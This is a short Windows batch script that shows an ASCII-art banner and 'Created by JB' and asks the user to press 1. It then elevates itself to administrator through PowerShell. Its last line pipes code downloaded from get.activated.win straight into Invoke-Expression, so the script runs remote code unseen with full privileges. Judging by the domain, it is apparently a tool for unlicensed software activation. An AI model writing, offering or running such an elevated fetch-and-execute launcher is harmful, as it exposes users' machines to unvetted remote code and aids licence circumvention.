@echo off
color 0a :: Set text color to green

:: Print ASCII Art
echo.
echo.                                                                                 
echo.                                                                                 
echo.                                       =====  =-:.                                        
echo.                                       @@@@@..@@@@#-                                      
echo.                                       @@@@@..@@@@@@#                                     
echo.                                       @@@@@:  .#@@@@-                                    
echo.                                       @@@@@:   -@@@@:                                    
echo.                                       @@@@@: =*@@@@+                                     
echo.                                       @@@@@: @@@@@%#=.                                   
echo.                                       %@@@@: ###%@@@@@+                                  
echo.                                       @@@@@:     .#@@@@=                                 
echo.                                      =@@@@@       =@@@@#                                 
echo.                              ::    :*@@@@@= ....:+@@@@@=                                 
echo.                             +@@@@@@@@@@@%- =@@@@@@@@@@+                                  
echo.                            +@@@@@@@@@@#- :#@@@@@@@@%+.                                   
echo.                             .-=+**+=:   .--------:.                                       
echo.

:: Print Created by JB
echo Created by JB
echo.

:: Ask user to press 1 to continue
set /p choice="Press 1 to continue: "
if "%choice%" neq "1" (
    echo Exiting...
    exit /b
)

:: Check for administrative privileges
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Requesting administrative privileges...
    powershell -Command "Start-Process '%~0' -Verb RunAs"
    exit /b
)

:: Your PowerShell command goes here
powershell -Command "Invoke-RestMethod https://get.activated.win | Invoke-Expression"
